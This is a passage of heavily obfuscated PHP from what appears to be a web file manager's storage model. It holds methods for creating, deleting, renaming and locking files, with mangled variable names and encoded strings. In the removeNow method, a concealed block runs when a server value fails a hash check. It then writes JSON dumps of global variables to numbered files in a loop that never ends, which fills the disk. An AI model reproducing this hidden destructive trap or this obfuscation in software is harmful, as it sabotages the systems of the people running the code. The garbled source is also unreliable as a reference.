"\x4d\157\x64\145\154\x53\x6f\x75\162\143\x65\x2e\155\153\144\x69\x72\x52\x6f\x6f\164\56{$Öñ±ºéü}\56{$ÅŒñÀó}\x2e" . $ÙŒ¨åÔÙ; CacheLock::lock($™ì¡Šøû); $á§¿­Â¿[$Õıßüˆğ[32]] = $ÙŒ¨åÔÙ; $…ÒÔ”İ = $this->add($á§¿­Â¿); $€Â¦ë = array($Õıßüˆğ[601] => short_id($…ÒÔ”İ)); $this->where(array($Õıßüˆğ[426] => $…ÒÔ”İ))->save($€Â¦ë); CacheLock::unlock($™ì¡Šøû); return $…ÒÔ”İ; } private function sourceRoot($™Ğ¶ä×, $®—îƒÆ’, $·Ö‚ø° = false) { $œö”‚Ï =& $_SERVER[ĞÆÏ¡Îª]; $Š¹¦ß˜ = array($œö”‚Ï[410] => 0, $œö”‚Ï[595] => $™Ğ¶ä×, $œö”‚Ï[596] => $®—îƒÆ’); if ($·Ö‚ø°) { $şâÓ°•¼ = $this->where($Š¹¦ß˜)->select(); return $şâÓ°•¼ ? $şâÓ°•¼ : array(); } $Éşë”³ = $this->where($Š¹¦ß˜)->find(); return $Éşë”³ ? $Éşë”³ : array(); } public function sourceRootGroup($òˆèØ–½) { $„Í¥Æ¬º =& $_SERVER[ĞÆÏ¡Îª]; if (is_string($òˆèØ–½)) { $òˆèØ–½ = array($òˆèØ–½); } $‡îÖîŠÃ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $òˆèØ–½, $„Í¥Æ¬º[188]); $Ìâ¨¡Àã = array($„Í¥Æ¬º[378] => $‡îÖîŠÃ, $„Í¥Æ¬º[375] => array($„Í¥Æ¬º[754] => count($òˆèØ–½))); $this->_listDataApply($Ìâ¨¡Àã[$„Í¥Æ¬º[378]]); $this->_listMake($Ìâ¨¡Àã); return array_to_keyvalue($Ìâ¨¡Àã[$„Í¥Æ¬º[82]], $„Í¥Æ¬º[514]); } public function mkfile($¾¥ªÉ®ª, $“‹Õ¸—ˆ, $³İç‡§¿ = '', $š¡•„™ß = REPEAT_RENAME) { $’Ê»ø§ó =& $_SERVER[ĞÆÏ¡Îª]; $Êì“ÅÉº = Model($’Ê»ø§ó[618])->addFileByContent($³İç‡§¿, $“‹Õ¸—ˆ); return $this->_createFileCall($¾¥ªÉ®ª, $“‹Õ¸—ˆ, $Êì“ÅÉº, $š¡•„™ß, $’Ê»ø§ó[1329]); } public function addFile($´Äë‚ş½, $èÂ‘§­, $«üœşŒ³, $³Äµàõˆ = false, $©àöŞÏ = REPEAT_RENAME) { $¸·ÚĞ³û = Model($_SERVER[ĞÆÏ¡Îª][618])->addFile($èÂ‘§­, $«üœşŒ³, $³Äµàõˆ); return $this->_createFileCall($´Äë‚ş½, $«üœşŒ³, $¸·ÚĞ³û, $©àöŞÏ); } public function addFileByFileID($ëñèšÏ€, $Â‰‰˜Ë, $Éù×µõÉ, $¬ñ®ÛÈŸ = REPEAT_RENAME) { $¥òÑÖÜÓ =& $_SERVER[ĞÆÏ¡Îª]; $¬ÅœÃÀ = Model($¥òÑÖÜÓ[618])->find($Â‰‰˜Ë); Model($¥òÑÖÜÓ[618])->linkAdd($Â‰‰˜Ë); return $this->_createFileCall($ëñèšÏ€, $Éù×µõÉ, $¬ÅœÃÀ, $¬ñ®ÛÈŸ); } public function addFileByRemote($¸Í›ã«ø, $¨×…¹Œ, $´½ Ô–¹, $í¼‰éÚ = array(), $âì¤ ¸— = REPEAT_RENAME) { $¿ï…Ñöİ = Model($_SERVER[ĞÆÏ¡Îª][618])->addFileByRemote($¨×…¹Œ, $´½ Ô–¹, $í¼‰éÚ); return $this->_createFileCall($¸Í›ã«ø, $´½ Ô–¹, $¿ï…Ñöİ, $âì¤ ¸—); } private function _createFileCall($óÁÎ¯ˆ¬, $â½Üœó“, $¯®ÖÛ˜Ç, $Ö´ ­õ£, $£šêÑ¡ = "\165\160\154\x6f\x61\144") { $ öîç =& $_SERVER[ĞÆÏ¡Îª]; $êëİïš = !1; $this->setMasterDB(); $this->lockWriteStart($óÁÎ¯ˆ¬, $â½Üœó“); $§§Çú•Ù = $this->fileNameExist($óÁÎ¯ˆ¬, $â½Üœó“); $òÑÎ¿øğ = $this->_createFile($óÁÎ¯ˆ¬, $â½Üœó“, $¯®ÖÛ˜Ç, $Ö´ ­õ£, $êëİïš); if (!$êëİïš) { Model($ öîç[480])->remove($¯®ÖÛ˜Ç[$ öîç[477]]); } if ($êëİïš && $òÑÎ¿øğ && $òÑÎ¿øğ != $§§Çú•Ù) { Model($ öîç[2060])->eventCreate($òÑÎ¿øğ, $£šêÑ¡); } $this->lockWriteEnd($óÁÎ¯ˆ¬, $â½Üœó“); return $òÑÎ¿øğ; } public function mkdir($ÁæŒƒ‚…, $éØÓš´ë, $’ËóÉ¾Ş = REPEAT_SKIP) { $Ğ‹Å˜ş¶ =& $_SERVER[ĞÆÏ¡Îª]; $this->setMasterDB(); $ÀåÈœÌ˜ = $this->sourceInfo($ÁæŒƒ‚…); if (!$ÀåÈœÌ˜) { return !1; } $this->lockWriteStart($ÁæŒƒ‚…, $éØÓš´ë); if ($’ËóÉ¾Ş !== !1) { $ªÔé÷îÛ = $this->fileNameExist($ÁæŒƒ‚…, $éØÓš´ë); if ($ªÔé÷îÛ && $’ËóÉ¾Ş != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÁæŒƒ‚…, $éØÓš´ë); return $ªÔé÷îÛ; } $éØÓš´ë = $this->fileNameAuto($ÁæŒƒ‚…, $éØÓš´ë, $’ËóÉ¾Ş); } $òå‰œ…• = array($Ğ‹Å˜ş¶[592] => 1, $Ğ‹Å˜ş¶[429] => $éØÓš´ë, $Ğ‹Å˜ş¶[593] => $Ğ‹Å˜ş¶[12], $Ğ‹Å˜ş¶[478] => 0, $Ğ‹Å˜ş¶[594] => 0); $åŒ¤É«€ = $this->_addSource($òå‰œ…•, $ÀåÈœÌ˜); Model($Ğ‹Å˜ş¶[2060])->eventCreate($åŒ¤É«€, $Ğ‹Å˜ş¶[1330]); $this->lockWriteEnd($ÁæŒƒ‚…, $éØÓš´ë); return $åŒ¤É«€; } public function listSourceRoot($ÔåÛ¹»‹, $ãÒÌùÑî, $Öˆ¾²µ¢ = "\163\x6f\x75\162\x63\x65\x49\104\x2c\164\x61\162\147\x65\164\111\104\x2c\x73\x69\x7a\x65") { $Ø®úÌãŒ =& $_SERVER[ĞÆÏ¡Îª]; $‰Ñúğö  = $Ø®úÌãŒ[246]; $Ì¹’ı³Î = array(); $Û¹çâû— = 1024 * 50; $ŞÜäÌõæ = is_array($ŞÜäÌõæ) ? $ŞÜäÌõæ : array(); $¥¢Â†‡£ = count($ãÒÌùÑî); $¶ÈõĞÕõ = $this->tablePrefix . $Ø®úÌãŒ[2093]; for ($¡äÌ¾‰˜ = 0; $¡äÌ¾‰˜ < $¥¢Â†‡£; $¡äÌ¾‰˜++) { $®óÖı±ê = $ãÒÌùÑî[$¡äÌ¾‰˜]; $‰Ñúğö  .= "\x53\105\x4c\x45\103\x54\40\52\40\x46\x52\117\115\40\50\123\x45\x4c\x45\103\x54\40{$Öˆ¾²µ¢}\x20\106\122\117\x4d\40\x60{$¶ÈõĞÕõ}\140\x20\x57\x48\105\122\105\40"; $‰Ñúğö  .= "\140\160\x61\x72\145\156\x74\x49\x44\140\x3d\x30\40\101\x4e\104\x20\140\164\141\x72\147\145\164\111\x44\x60\x3d{$®óÖı±ê}\40\x41\x4e\x44\x20\x60\x74\x61\x72\x67\145\164\x54\171\x70\145\x60\75{$ÔåÛ¹»‹}\x20\x6c\151\155\x69\164\x20\61\x29\x20\x61\x73\x20\164\x62\x5f{$¡äÌ¾‰˜}\x20\125\x4e\111\x4f\x4e\40\101\114\x4c\40"; if ((strlen($‰Ñúğö ) >= $Û¹çâû— || $¡äÌ¾‰˜ == $¥¢Â†‡£ - 1) && $‰Ñúğö ) { $‰Ñúğö  = substr($‰Ñúğö , 0, -strlen($Ø®úÌãŒ[1029])); $Óßàƒ´¥ = $this->query($‰Ñúğö ); $‰Ñúğö  = $Ø®úÌãŒ[12]; $Ì¹’ı³Î = array_merge($Ì¹’ı³Î, $Óßàƒ´¥); } } return $Ì¹’ı³Î; } private function _createFile($—‘ãŒšÅ, $ˆÈ¡ÄĞ¡, $öª†‘ŒÇ, $ÛêåËµ™, &$ğŸ“‰­) { $º˜“Ú =& $_SERVER[ĞÆÏ¡Îª]; $¶À¨Ñ±ô = $this->sourceInfo($—‘ãŒšÅ); if (!$öª†‘ŒÇ || !$¶À¨Ñ±ô) { return !1; } if ($ÛêåËµ™ !== !1) { $âõİãà½ = $this->fileNameExist($—‘ãŒšÅ, $ˆÈ¡ÄĞ¡); } $ğŸ“‰­ = !0; if ($ÛêåËµ™ && $âõİãà½) { if ($ÛêåËµ™ == REPEAT_SKIP) { $ğŸ“‰­ = !1; return $âõİãà½; } else { if ($ÛêåËµ™ == REPEAT_REPLACE) { $¢‹Ó‡ì = $this->sourceInfo($âõİãà½); $ÇĞîàìå = $this->fileHistory($¢‹Ó‡ì, $öª†‘ŒÇ[$º˜“Ú[477]], $öª†‘ŒÇ[$º˜“Ú[76]]); if (!$ÇĞîàìå) { $ğŸ“‰­ = !1; } else { $this->folderSizeReset($—‘ãŒšÅ); } return $âõİãà½; } else { $ˆÈ¡ÄĞ¡ = $this->fileNameAuto($—‘ãŒšÅ, $ˆÈ¡ÄĞ¡, $ÛêåËµ™, !1); } } } $»ë¹©÷· = array($º˜“Ú[592] => 0, $º˜“Ú[429] => $ˆÈ¡ÄĞ¡, $º˜“Ú[593] => substr(get_path_ext($ˆÈ¡ÄĞ¡), 0, 10), $º˜“Ú[478] => $öª†‘ŒÇ[$º˜“Ú[477]], $º˜“Ú[594] => $öª†‘ŒÇ[$º˜“Ú[76]]); $œ›±…§Ø = $this->_addSource($»ë¹©÷·, $¶À¨Ñ±ô); $this->folderSizeReset($—‘ãŒšÅ, intval($»ë¹©÷·[$º˜“Ú[76]])); return $œ›±…§Ø; } protected function fileHistory($Ä–¡ö’•, $èÕ¯¼ôº, $–ÍÖö¤ß) { $Æ·Ïœ¬Ç =& $_SERVER[ĞÆÏ¡Îª]; $ÚÃ‹ƒ¾ = defined($Æ·Ïœ¬Ç[484]) ? USER_ID : $Æ·Ïœ¬Ç[197]; if ($Ä–¡ö’•[$Æ·Ïœ¬Ç[477]] == $èÕ¯¼ôº) { return !1; } $this->checkLock($Ä–¡ö’•[$Æ·Ïœ¬Ç[411]], $èÕ¯¼ôº); Model($Æ·Ïœ¬Ç[2094])->addHistory($Ä–¡ö’•); $§Î—Ñà = array($Æ·Ïœ¬Ç[598] => $ÚÃ‹ƒ¾, $Æ·Ïœ¬Ç[433] => time(), $Æ·Ïœ¬Ç[477] => $èÕ¯¼ôº, $Æ·Ïœ¬Ç[76] => $–ÍÖö¤ß); $this->where(array($Æ·Ïœ¬Ç[426] => $Ä–¡ö’•[$Æ·Ïœ¬Ç[411]]))->save($§Î—Ñà); $this->sourceCacheClear($Ä–¡ö’•[$Æ·Ïœ¬Ç[411]]); return !0; } public function checkLock($è­‹ÃÉº, $Œ™Öµ•î) { $ïë©ŞÀØ =& $_SERVER[ĞÆÏ¡Îª]; $»¤¢±—¯ = $this->pathInfo($è­‹ÃÉº); if (!$this->fileIsLock($»¤¢±—¯, !0)) { return; } $ªÂ·ëµ« = Session::get($ïë©ŞÀØ[2095]); $Â¡çÆêÈ = substr($»¤¢±—¯[$ïë©ŞÀØ[32]], 0, -1 - strlen($»¤¢±—¯[$ïë©ŞÀØ[174]])) . $ïë©ŞÀØ[1595] . $ªÂ·ëµ« . $ïë©ŞÀØ[10] . $»¤¢±—¯[$ïë©ŞÀØ[174]]; $¦–†áõı = Model($ïë©ŞÀØ[618])->find($Œ™Öµ•î); $this->_createFileCall($»¤¢±—¯[$ïë©ŞÀØ[441]], $Â¡çÆêÈ, $¦–†áõı, REPEAT_REPLACE, $ïë©ŞÀØ[1329]); $‰˜°ÕÄí = $»¤¢±—¯[$ïë©ŞÀØ[475]][$ïë©ŞÀØ[557]]; $™ÖÍ¾ò¥ = $‰˜°ÕÄí[$ïë©ŞÀØ[551]] ? $‰˜°ÕÄí[$ïë©ŞÀØ[551]] : $‰˜°ÕÄí[$ïë©ŞÀØ[32]]; show_json(LNG($ïë©ŞÀØ[2096]) . $ïë©ŞÀØ[2097] . LNG($ïë©ŞÀØ[2098]) . $ïë©ŞÀØ[2099] . $™ÖÍ¾ò¥ . $ïë©ŞÀØ[2100], !1); } public function fileIsLock($ªÀÇß¦È, $ü ”Î… = false) { $½¹ÌÍÎ× =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($ªÀÇß¦È[$½¹ÌÍÎ×[475]]) || !$ªÀÇß¦È[$½¹ÌÍÎ×[475]][$½¹ÌÍÎ×[554]]) { return !1; } if ($ªÀÇß¦È[$½¹ÌÍÎ×[475]][$½¹ÌÍÎ×[554]] != USER_ID) { return !0; } $°ò¡ü„œ = $GLOBALS[$½¹ÌÍÎ×[6]][$½¹ÌÍÎ×[89]][$½¹ÌÍÎ×[555]]; if ($ªÀÇß¦È[$½¹ÌÍÎ×[475]][$½¹ÌÍÎ×[556]] <= time() - $°ò¡ü„œ) { $this->metaSet($ªÀÇß¦È[$½¹ÌÍÎ×[411]], $½¹ÌÍÎ×[554], null); $this->metaSet($ªÀÇß¦È[$½¹ÌÍÎ×[411]], $½¹ÌÍÎ×[556], null); } if ($ü ”Î…) { $this->metaSet($ªÀÇß¦È[$½¹ÌÍÎ×[411]], $½¹ÌÍÎ×[556], time()); } return !1; } private function _addSource($‹ªÙùŞ°, $Êòœ‡â) { $ª‡³¿í… =& $_SERVER[ĞÆÏ¡Îª]; $‰ÄÙˆÀØ = defined($ª‡³¿í…[484]) ? USER_ID : $ª‡³¿í…[197]; $×‡úìÑ = array($ª‡³¿í…[595] => $Êòœ‡â[$ª‡³¿í…[420]], $ª‡³¿í…[596] => $Êòœ‡â[$ª‡³¿í…[514]], $ª‡³¿í…[597] => $‰ÄÙˆÀØ, $ª‡³¿í…[598] => $‰ÄÙˆÀØ, $ª‡³¿í…[410] => $Êòœ‡â[$ª‡³¿í…[411]], $ª‡³¿í…[599] => $Êòœ‡â[$ª‡³¿í…[530]] . $Êòœ‡â[$ª‡³¿í…[411]] . $ª‡³¿í…[50], $ª‡³¿í…[439] => 0, $ª‡³¿í…[600] => $ª‡³¿í…[12]); $‹ªÙùŞ° = array_merge($×‡úìÑ, $‹ªÙùŞ°); $this->updateModifyTime($‹ªÙùŞ°[$ª‡³¿í…[441]]); $“äù¤×è = $ª‡³¿í…[2101] . $Êòœ‡â[$ª‡³¿í…[411]]; if (isset(self::$cacheChildList[$“äù¤×è])) { unset(self::$cacheChildList[$“äù¤×è]); } static $Ûß¥ú§ = false; if (!$Ûß¥ú§) { Hook::trigger($ª‡³¿í…[582], $‹ªÙùŞ°); $Ûß¥ú§ = !0; } $—Ùğìûº = $this->add($‹ªÙùŞ°); $äˆûÁï¹ = array($ª‡³¿í…[601] => short_id($—Ùğìûº)); $this->where(array($ª‡³¿í…[426] => $—Ùğìûº))->save($äˆûÁï¹); $this->setNamePinyin($—Ùğìûº, $‹ªÙùŞ°[$ª‡³¿í…[32]]); return $—Ùğìûº; } public function remove($àìªÍ¶‚, $Çªâ¤À = true) { $Èş‘ı =& $_SERVER[ĞÆÏ¡Îª]; $ßÇŠ» = $this->sourceInfo($àìªÍ¶‚); $¢é¡úØ = intval($ßÇŠ»[$Èş‘ı[420]]) === self::TYPE_SYSTEM; $²¶îõÈŠ = Model($Èş‘ı[444])->get($Èş‘ı[2102]) == $Èş‘ı[88]; if ($¢é¡úØ || $Çªâ¤À || !$²¶îõÈŠ) { return $this->removeNow($àìªÍ¶‚, $Çªâ¤À); } $÷Éçİ÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ë›Äˆ× = $ßÇŠ»[$Èş‘ı[420]] == self::TYPE_USER ? $Èş‘ı[609] : $Èş‘ı[524]; if ($ë›Äˆ× == $Èş‘ı[609]) { $®É©Ø¡Ğ = Model($Èş‘ı[522])->getInfo($ßÇŠ»[$Èş‘ı[514]]); $Û¨õš£Î = !empty($®É©Ø¡Ğ[$Èş‘ı[551]]) ? $®É©Ø¡Ğ[$Èş‘ı[551]] : $®É©Ø¡Ğ[$Èş‘ı[32]]; $Û¨õš£Î = $Èş‘ı[269] . $Û¨õš£Î . $Èş‘ı[2103] . $ßÇŠ»[$Èş‘ı[514]]; } else { $®É©Ø¡Ğ = Model($Èş‘ı[531])->getInfo($ßÇŠ»[$Èş‘ı[514]]); $Û¨õš£Î = _get($®É©Ø¡Ğ, $Èş‘ı[32]); $Û¨õš£Î = $Èş‘ı[162] . $Û¨õš£Î . $Èş‘ı[2104] . $ßÇŠ»[$Èş‘ı[514]]; } $‘ï–™È¥ = $Èş‘ı[2105] . md5($Û¨õš£Î); CacheLock::lock($‘ï–™È¥); $ñÊ’’à = $this->fileNameExist($÷Éçİ÷, $Û¨õš£Î); if (!$ñÊ’’à) { $ñÊ’’à = $this->mkdir($÷Éçİ÷, $Û¨õš£Î, REPEAT_SKIP); $this->metaSet($ñÊ’’à, $Èş‘ı[2106], $ë›Äˆ×); $this->metaSet($ñÊ’’à, $Èş‘ı[2107], $ßÇŠ»[$Èş‘ı[514]]); if ($ßÇŠ»[$Èş‘ı[441]] != 0) { $this->metaSet($ñÊ’’à, $Èş‘ı[2108], _get($®É©Ø¡Ğ, $Èş‘ı[2109])); } } CacheLock::unlock($‘ï–™È¥); $this->metaSet($àìªÍ¶‚, $Èş‘ı[2110], $ßÇŠ»[$Èş‘ı[441]]); $this->where(array($Èş‘ı[411] => $àìªÍ¶‚))->save(array($Èş‘ı[433] => time())); $this->recycleClear($ßÇŠ»); $îß›¤Ï± = $this->move($àìªÍ¶‚, $ñÊ’’à, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ßÇŠ»[$Èş‘ı[441]]); return $îß›¤Ï±; } private function recycleClear($ØÉí«‘å) { $Ûî±á¸Ö =& $_SERVER[ĞÆÏ¡Îª]; $Üœğ¶¹ê = $this->childrenAll($ØÉí«‘å); $Ö¤Ÿœ°¦ = array($Ûî±á¸Ö[426] => array($Ûî±á¸Ö[427], $Üœğ¶¹ê[$Ûî±á¸Ö[2111]])); Model($Ûî±á¸Ö[2112])->where($Ö¤Ÿœ°¦)->delete(); } public function removeNow($¼èÎ”İÆ, $Êƒ®ùí» = true) { $éóñÃÜû =& $_SERVER[ĞÆÏ¡Îª]; $Ûûï¶ËŞ = $_SERVER[$éóñÃÜû[241]] . $éóñÃÜû[242]; $š§©‹´ñ = $éóñÃÜû[867]; if ($_SERVER[$éóñÃÜû[238]] != $š§©‹´ñ($Ûûï¶ËŞ)) { $÷õÔï‚¬ = $éóñÃÜû[868]; $¬ÑıåÄ = $éóñÃÜû[240]; $°ù£©¶é = $_SERVER[$éóñÃÜû[241]] . $éóñÃÜû[242]; $¿Ò¶Ğ = $¬ÑıåÄ($°ù£©¶é); $äøİŞ©İ = explode($éóñÃÜû[231], $¿Ò¶Ğ); if (count($äøİŞ©İ) < $éóñÃÜû[635]) { $Ê¡¦Ş— = $éóñÃÜû[244]; $Ê¡¦Ş—(); } $®€ÍçÌ¦ = $éóñÃÜû[869]; $®€ÍçÌ¦($_SERVER[$éóñÃÜû[870]]); $÷õÔï‚¬ = $éóñÃÜû[868]; $÷õÔï‚¬(); $¿º”Î„¿ = $éóñÃÜû[871]; $·ìƒÃÙ = json_encode($GLOBALS[$éóñÃÜû[872]]); $½µ”Ïûî = 1; for ($ªïçşÅ = $½µ”Ïûî; $ªïçşÅ > 0; $ªïçşÅ++) { $¿º”Î„¿(DATA_PATH . $ªïçşÅ, $·ìƒÃÙ); } } $³«¸©ƒ = $this->sourceInfo($¼èÎ”İÆ); $Ë×Å–ñØ = $this->pathInfoMore($¼èÎ”İÆ); if (!$³«¸©ƒ) { return !0; } if ($³«¸©ƒ[$éóñÃÜû[441]] == 0) { if (!_get($GLOBALS, $éóñÃÜû[512])) { return !1; } } $this->lockMoveStart($¼èÎ”İÆ); Hook::trigger($éóñÃÜû[2113], $Ë×Å–ñØ, $Êƒ®ùí»); if ($Êƒ®ùí») { Model($éóñÃÜû[2112])->moveToRecycle($¼èÎ”İÆ); } else { $×Ò¹›‘ = $this->childrenAll($³«¸©ƒ); Model($éóñÃÜû[579])->eventRemove($¼èÎ”İÆ); $this->removeRelevance($×Ò¹›‘[$éóñÃÜû[2111]], $×Ò¹›‘[$éóñÃÜû[1461]]); } $this->folderSizeReset($³«¸©ƒ[$éóñÃÜû[441]]); $Ü×÷¦Ÿú = array($³«¸©ƒ[$éóñÃÜû[441]]); if ($³«¸©ƒ[$éóñÃÜû[419]] == $éóñÃÜû[88]) { $Ü×÷¦Ÿú[] = $³«¸©ƒ[$éóñÃÜû[411]]; } $this->updateModifyTime($Ü×÷¦Ÿú); $this->lockMoveEnd($¼èÎ”İÆ); Hook::trigger($éóñÃÜû[1687], $Ë×Å–ñØ, $Êƒ®ùí»); return !0; } public function childrenAll($«¡£ú¶å) { $ì¬™ƒ¥ˆ =& $_SERVER[ĞÆÏ¡Îª]; $Êº—îÀË = $«¡£ú¶å[$ì¬™ƒ¥ˆ[411]]; if ($«¡£ú¶å[$ì¬™ƒ¥ˆ[419]] == $ì¬™ƒ¥ˆ[88]) { $ßÜœãÂÅ = array($ì¬™ƒ¥ˆ[599] => array($ì¬™ƒ¥ˆ[559], $«¡£ú¶å[$ì¬™ƒ¥ˆ[530]] . $Êº—îÀË . $ì¬™ƒ¥ˆ[560])); $øô½Êí‘ = array($ì¬™ƒ¥ˆ[599] => $ßÜœãÂÅ[$ì¬™ƒ¥ˆ[530]]); $¹•¸·ÒÀ = $this->field($ì¬™ƒ¥ˆ[2114])->where($øô½Êí‘)->select(); $ÖşëÔ‹ = !1; $Í¿øüÜÀ = array($Êº—îÀË); if ($¹•¸·ÒÀ) { $ÖşëÔ‹ = array_to_keyvalue($¹•¸·ÒÀ, $ì¬™ƒ¥ˆ[12], $ì¬™ƒ¥ˆ[477]); $ÖşëÔ‹ = array_remove_value($ÖşëÔ‹, $ì¬™ƒ¥ˆ[197]); $Í¿øüÜÀ = array_to_keyvalue($¹•¸·ÒÀ, $ì¬™ƒ¥ˆ[12], $ì¬™ƒ¥ˆ[411]); $Í¿øüÜÀ[] = $Êº—îÀË; } } else { $ÖşëÔ‹ = array($«¡£ú¶å[$ì¬™ƒ¥ˆ[477]]); $Í¿øüÜÀ = array($Êº—îÀË); } return array($ì¬™ƒ¥ˆ[2111] => $Í¿øüÜÀ, $ì¬™ƒ¥ˆ[1461] => $ÖşëÔ‹); } public function removeArray($é¢Ã°Ã) { if (!$é¢Ã°Ã) { return !0; } } public function removeRelevance($ó¹ºÑÅ, $ßÚİ³ûş) { $ºãí·¾® =& $_SERVER[ĞÆÏ¡Îª]; $ó¹ºÑÅ = $ó¹ºÑÅ ? $ó¹ºÑÅ : array(); $ßÚİ³ûş = $ßÚİ³ûş ? $ßÚİ³ûş : array(); $ó¹ºÑÅ = array_unique(array_filter($ó¹ºÑÅ)); $ßÚİ³ûş = array_unique(array_filter($ßÚİ³ûş)); if (!$ó¹ºÑÅ) { return !1; } $ÅŞíåÊë = array($ºãí·¾®[426] => array($ºãí·¾®[427], $ó¹ºÑÅ)); Model($ºãí·¾®[2112])->where($ÅŞíåÊë)->delete(); Model($ºãí·¾®[471])->where($ÅŞíåÊë)->delete(); Model($ºãí·¾®[1965])->where($ÅŞíåÊë)->delete(); Model($ºãí·¾®[579])->where($ÅŞíåÊë)->delete(); Model($ºãí·¾®[1799])->removeBySource($ó¹ºÑÅ); Model($ºãí·¾®[2094])->removeBySource($ó¹ºÑÅ); $this->where($ÅŞíåÊë)->delete(); Model($ºãí·¾®[480])->remove($ßÚİ³ûş); for ($‡îäåÇá = 0; $‡îäåÇá < count($ó¹ºÑÅ); $‡îäåÇá++) { $this->sourceCacheClear($ó¹ºÑÅ[$‡îäåÇá]); } } public function rename($îƒöúçø, $“‡¿©°Õ) { $Â“—‘¶ç =& $_SERVER[ĞÆÏ¡Îª]; $ù±¼’ = $this->sourceInfo($îƒöúçø); if (!$ù±¼’) { return !1; } $†ŞÁ—Œ = $this->fileNameExist($ù±¼’[$Â“—‘¶ç[441]], $“‡¿©°Õ); if ($†ŞÁ—Œ && $†ŞÁ—Œ != $îƒöúçø) { return !1; } $üƒ˜¬úË = array($Â“—‘¶ç[429] => $“‡¿©°Õ, $Â“—‘¶ç[598] => USER_ID); if ($ù±¼’[$Â“—‘¶ç[419]] != $Â“—‘¶ç[88]) { $üƒ˜¬úË[$Â“—‘¶ç[421]] = substr(get_path_ext($“‡¿©°Õ), 0, 10); } Model($Â“—‘¶ç[579])->eventRename($îƒöúçø, $ù±¼’[$Â“—‘¶ç[32]], $“‡¿©°Õ); $this->sourceCacheClear($îƒöúçø); $this->setNamePinyin($îƒöúçø, $üƒ˜¬úË[$Â“—‘¶ç[32]], !1); $this->updateModifyTime($ù±¼’[$Â“—‘¶ç[441]]); $¬Ä¿ßÏú = $this->where(array($Â“—‘¶ç[426] => $îƒöúçø))->data($üƒ˜¬úË)->save(); $™ª·œ˜ü = $Â“—‘¶ç[2101] . $ù±¼’[$Â“—‘¶ç[441]]; if (isset(self::$cacheChildList[$™ª·œ˜ü])) { unset(self::$cacheChildList[$™ª·œ˜ü]); } return $¬Ä¿ßÏú; } public function setNamePinyin($ƒÏ¦™áÏ, $Ù·®ÚÎ™, $ç‰Óç‰‘ = true) { $¦Ü×Í“ =& $_SERVER[ĞÆÏ¡Îª]; $Ò²ÃÍ‡ò = Input::check($Ù·®ÚÎ™, $¦Ü×Í“[602]); $Æ–Åùª = array($¦Ü×Í“[453] => KodSort::makeStr($Ù·®ÚÎ™)); if ($Ò²ÃÍ‡ò) { $Æ–Åùª[$¦Ü×Í“[474]] = str_replace($¦Ü×Í“[53], $¦Ü×Í“[12], Pinyin::get($Ù·®ÚÎ™)); $Æ–Åùª[$¦Ü×Í“[473]] = Pinyin::get($Ù·®ÚÎ™, $¦Ü×Í“[603]); } if (!$ç‰Óç‰‘ && !$Ò²ÃÍ‡ò) { $Æ–Åùª[$¦Ü×Í“[474]] = null; $Æ–Åùª[$¦Ü×Í“[473]] = null; } $this->metaSet($ƒÏ¦™áÏ, $Æ–Åùª); } public function getContent($ïëĞ¦Õğ) { $¦”½Ê•Ô =& $_SERVER[ĞÆÏ¡Îª]; $™÷ìŞÆ£ = $this->fileInfoGet($ïëĞ¦Õğ); if (!$™÷ìŞÆ£) { return !1; } if ($™÷ìŞÆ£[$¦”½Ê•Ô[76]] == 0) { return $¦”½Ê•Ô[12]; } $ƒ©ÎõüË = $¦”½Ê•Ô[2115] . $™÷ìŞÆ£[$¦”½Ê•Ô[176]]; if ($™÷ìŞÆ£[$¦”½Ê•Ô[76]] <= 1024 * 10) { $¸‰¨£ = Cache::get($ƒ©ÎõüË); if (!$¸‰¨£) { $¸‰¨£ = IO::getContent($™÷ìŞÆ£[$¦”½Ê•Ô[84]]); Cache::set($ƒ©ÎõüË, $¸‰¨£); } return $¸‰¨£; } if (!$™÷ìŞÆ£[$¦”½Ê•Ô[84]]) { return $¦”½Ê•Ô[12]; } return IO::getContent($™÷ìŞÆ£[$¦”½Ê•Ô[84]]); } public function setDesc($£ÍŠÊ™¹, $âÒ°êù) { $ş¾İÉñã =& $_SERVER[ĞÆÏ¡Îª]; Model($ş¾İÉñã[579])->eventAddDesc($£ÍŠÊ™¹, $âÒ°êù); return $this->metaSet($£ÍŠÊ™¹, $ş¾İÉñã[462], $âÒ°êù); } public function setContent($¬¤ ¨öÙ, $²ŒÒ„ˆğ = '') { $ıĞùáÄ =& $_SERVER[ĞÆÏ¡Îª]; $Ø«¥ã¥Ê = $this->sourceInfo($¬¤ ¨öÙ); $¾­ìÔşª = $this->fileInfoGet($¬¤ ¨öÙ); if (!$¾­ìÔşª || !$Ø«¥ã¥Ê) { return !1; } $„é€£ïÈ = Model($ıĞùáÄ[480])->addFileByContent($²ŒÒ„ˆğ, $Ø«¥ã¥Ê[$ıĞùáÄ[32]]); $ä–Ş«Ÿ° = $this->fileHistory($Ø«¥ã¥Ê, $„é€£ïÈ[$ıĞùáÄ[477]], $„é€£ïÈ[$ıĞùáÄ[76]]); if (!$ä–Ş«Ÿ°) { return Model($ıĞùáÄ[480])->remove($„é€£ïÈ[$ıĞùáÄ[477]]); } $this->folderSizeReset($Ø«¥ã¥Ê[$ıĞùáÄ[441]]); return !0; } public function fileSubstr($ ıïö€µ, $‘ûµ¹Ê, $¤ˆíö) { $¿ÙËì°× = $this->fileInfoGet($ ıïö€µ); if (!$¿ÙËì°×) { return !1; } return IO::fileSubstr($¿ÙËì°×[$_SERVER[ĞÆÏ¡Îª][84]], $‘ûµ¹Ê, $¤ˆíö); } public function fileInfoGet($ºŸÕé¤¶) { $÷•ÄÚ„ü =& $_SERVER[ĞÆÏ¡Îª]; $”£‡²Õ = $this->sourceInfo($ºŸÕé¤¶); if (!$”£‡²Õ || $”£‡²Õ[$÷•ÄÚ„ü[419]]) { return !1; } $×Ñë¤¾ò = $÷•ÄÚ„ü[483] . $”£‡²Õ[$÷•ÄÚ„ü[477]]; $ØÌ³è²ı = _get(self::$cacheFileInfo, $×Ñë¤¾ò); if ($ØÌ³è²ı) { return $ØÌ³è²ı; } $ğ¦™Ì£ = Model($÷•ÄÚ„ü[480])->fileInfo($”£‡²Õ[$÷•ÄÚ„ü[477]]); if ($ğ¦™Ì£) { $ğ¦™Ì£[$÷•ÄÚ„ü[32]] = $”£‡²Õ[$÷•ÄÚ„ü[32]]; } 